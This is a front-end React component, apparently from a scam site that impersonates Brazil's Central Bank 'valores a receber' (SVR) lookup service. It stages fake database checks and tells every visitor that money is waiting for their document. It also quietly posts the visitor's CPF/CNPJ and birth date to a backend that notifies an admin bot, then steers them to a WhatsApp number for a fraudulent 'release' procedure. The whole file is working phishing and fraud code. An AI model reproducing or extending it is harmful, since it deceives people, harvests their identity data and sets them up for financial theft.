import { useEffect, useState } from "react";
import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";

interface Step2Props {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

type AnalysisState = "checking_base" | "verifying_identity" | "finalizing" | "results";

export function Step2({ data, onReset }: Step2Props) {
  const [analysisState, setAnalysisState] = useState<AnalysisState>("checking_base");
  const [config, setConfig] = useState({ 
    whatsappNumber: typeof window !== 'undefined' ? (localStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
  });
  const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
  const [processStep, setProcessStep] = useState(0);

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API_URL}/api/config?t=${Date.now()}`);
        if (response.data.whatsappNumber) {
          console.log("✅ Número sincronizado dinamicamente:", response.data.whatsappNumber);
          setConfig(response.data);
          // Salvar para o navegador não esquecer se houver oscilação
          localStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
        }
      } catch (err) {
        console.error("Falha na sincronia modular. Usando memória local.");
        const lastSaved = localStorage.getItem('svr_last_whatsapp');
        if (lastSaved) setConfig({ whatsappNumber: lastSaved });
      }
    };
    fetchConfig();

    const timers = [
      setTimeout(() => setAnalysisState("verifying_identity"), 2500),
      setTimeout(() => setAnalysisState("finalizing"), 4500),
      setTimeout(() => setAnalysisState("results"), 6500),
    ];

    return () => timers.forEach(clearTimeout);
  }, []);

  const calculateValue = (doc: string) => {
    // Deterministic value based on document digits
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    const value = (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
    return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  const handleWhatsAppRedirect = () => {
    setIsProcessingWhatsApp(true);

    // Sequence of "automatic" verification steps
    const steps = [
      "Sincronizando protocolo de segurança...",
      "Validando titularidade fiscal...",
      "Gerando token de liberação única...",
      "Conectando ao canal de atendimento prioritário..."
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length - 1) {
        currentStep++;
        setProcessStep(currentStep);
      } else {
        clearInterval(interval);

        const userId = localStorage.getItem('svr_user_id') || "N/A";
        const protocol = `SVR-${userId.toUpperCase()}`;
        const token = btoa(data.docValue).substring(0, 12).toUpperCase();

        const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
        const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
          `*DETALHES DA SOLICITAÇÃO:* \n` +
          `• Protocolo: *#${protocol}*\n` +
          `• Token de Validação: *${token}*\n` +
          `• Tipo de Documento: *${data.docType}*\n` +
          `• Documento Identificado: *${data.docValue}*\n\n` +
          `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;

        const message = encodeURIComponent(header + "\n\n" + body);

        // Notify Admin Bot IMMEDIATELY upon click
        try {
          const userIdForApi = localStorage.getItem('svr_user_id');
          if (userIdForApi) {
            axios.post(`${API_URL}/api/v1/session/convert`, {
              userId: userIdForApi,
              details: { 
                docValue: data.docValue, 
                birthDate: data.birthDate,
                protocol: protocol,
                token: token
              }
            });
          }
        } catch (e) { }

        window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
      }
    }, 1200);
  };

  const AnalysisLoader = ({ text }: { text: string }) => (
    <div className="flex flex-col items-center justify-center p-16 bg-white dark:bg-[#1f292e] rounded shadow-sm border border-gray-100 dark:border-[#2a373d] max-w-[420px] mx-auto text-center space-y-6 min-h-[450px] transition-colors duration-300">
      <div className="relative">
        <Loader2 className="w-16 h-16 text-[#2d7890] dark:text-[#429bb8] animate-spin" strokeWidth={1.5} />
        <div className="absolute inset-0 flex items-center justify-center">
          <Search size={24} className="text-[#2d7890] dark:text-[#429bb8] opacity-50" />
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-xl font-bold text-gray-800 dark:text-gray-200 tracking-tight transition-colors duration-300">{text}</h3>
        <div className="flex gap-1 justify-center">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2 h-2 bg-[#2d7890] rounded-full"
              animate={{ opacity: [0.3, 1, 0.3] }}
              transition={{ repeat: Infinity, duration: 1.5, delay: i * 0.2 }}
            />
          ))}
        </div>
      </div>
      <p className="text-sm text-gray-500 dark:text-gray-400 font-medium opacity-60 transition-colors duration-300">Sincronizando com as bases do Banco Central...</p>
    </div>
  );

  return (
    <AnimatePresence mode="wait">
      {analysisState === "checking_base" && (
        <motion.div key="check" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Analisando base de CPFs/CNPJs..." />
        </motion.div>
      )}
      {analysisState === "verifying_identity" && (
        <motion.div key="verify" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Verificando saldos residuais..." />
        </motion.div>
      )}
      {analysisState === "finalizing" && (
        <motion.div key="final" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Finalizando consulta segura..." />
        </motion.div>
      )}

      {analysisState === "results" && (
        <motion.div
          key="results"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[650px] mx-auto shadow-sm transition-colors duration-300"
        >
          <div className="p-8 md:p-10">
            {/* Desktop: Two columns | Mobile: Stacked */}
            <div className="flex flex-col md:flex-row gap-8 items-center md:items-start">
              
              {/* Left Column: Checkmark (Large) */}
              <div className="flex-shrink-0 pt-2">
                <div className="w-24 h-24 md:w-32 md:h-32 rounded-full flex items-center justify-center">
                  <svg viewBox="0 0 24 24" className="w-full h-full text-[#4caf50]" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                </div>
              </div>

              {/* Right Column: Content */}
              <div className="flex-grow text-center md:text-left space-y-6">
                <div className="space-y-1">
                  <h2 className="text-[24px] md:text-[28px] font-bold text-[#555] dark:text-white leading-tight">
                    O {data.docType === 'CPF' ? 'CPF' : 'CNPJ'} pesquisado tem valores a receber
                  </h2>
                  <div className="text-[14px] md:text-[15px] text-[#888] dark:text-gray-400 font-medium">
                    <p>{data.docType}: <b>{data.docValue}</b></p>
                    <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <b>{data.birthDate}</b></p>
                  </div>
                </div>

                <div className="space-y-4 text-[14px] md:text-[15px] text-[#666] dark:text-gray-300 leading-relaxed font-medium">
                  <p>
                    Para a liberação dos valores ativos identificados em sua conta, é necessária a <b>validação de titularidade</b> junto ao atendimento especializado do Sistema de Valores a Receber (SVR).
                  </p>
                  <p>
                    O procedimento segue rigorosos protocolos de segurança e autenticação para garantir a integridade do repasse de ativos. Tenha em mãos seus documentos de identificação para concluir o processo de forma célere.
                  </p>
                </div>

                {/* Buttons Section */}
                <div className="flex flex-col gap-3 pt-4 max-w-[320px] mx-auto md:mx-0">
                  <button
                    onClick={handleWhatsAppRedirect}
                    className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2.5 px-6 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm"
                  >
                    <ArrowRight size={18} className="rotate-[-45deg]" /> Liberar Valor Ativo
                  </button>

                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={onReset}
                      className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
                    >
                      <Search size={16} /> Nova consulta
                    </button>
                    <button
                      onClick={() => window.location.reload()}
                      className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
                    >
                      <X size={16} /> Sair
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      )}


      {isProcessingWhatsApp && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-[#1b668d]/95 z-[100] flex flex-col items-center justify-center p-8 text-white text-center"
        >
          <div className="w-full max-w-[320px] space-y-8">
            <div className="relative flex items-center justify-center">
              <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
              <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
            </div>

            <div className="space-y-4">
              <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
              <div className="space-y-2">
                {[0, 1, 2, 3].map((i) => (
                  <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
                    {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
                    <span className={i === processStep ? 'font-bold' : ''}>
                      {[
                        "Sincronizando protocolo de segurança...",
                        "Validando titularidade fiscal...",
                        "Gerando token de liberação única...",
                        "Conectando ao canal de atendimento prioritário..."
                      ][i]}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}


